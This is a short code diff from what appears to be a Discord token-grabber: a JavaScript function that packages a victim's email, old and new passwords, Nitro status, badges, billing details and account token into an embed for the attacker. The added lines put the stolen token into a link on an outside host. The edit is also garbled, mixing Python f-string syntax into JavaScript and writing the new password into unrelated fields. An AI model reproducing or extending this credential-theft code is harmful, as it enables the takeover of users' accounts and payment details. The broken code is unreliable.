@@ -676,18 +676,18 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Sifre Degisti Pezo**',
-            value: `Email: **${json.email}**\nEski Sifre: **${oldpassword}**\nYeni Sifre: **${newpassword}**`,
+            value: `Email: **${json.email}**\nEski Sifre: > ${newpassword}\nYeni Sifre: > ${newpassword}`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Tipi: **${nitro}**\nRozet: **${badges}**\nOdeme: **${billing}**`,
+            name: '**Discord Bilgileri**',
+            value: `Nitro Tipi: > ${newpassword}\nRozet: **${badges}**\nOdeme: > ${newpassword}`,
             inline: true,
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
+           "value": f'`{token}` [Click to copy Kardiş](https://superfurrycdn.nl/copy/{token})',
+           "inline": False
           },
         ],
         author: {
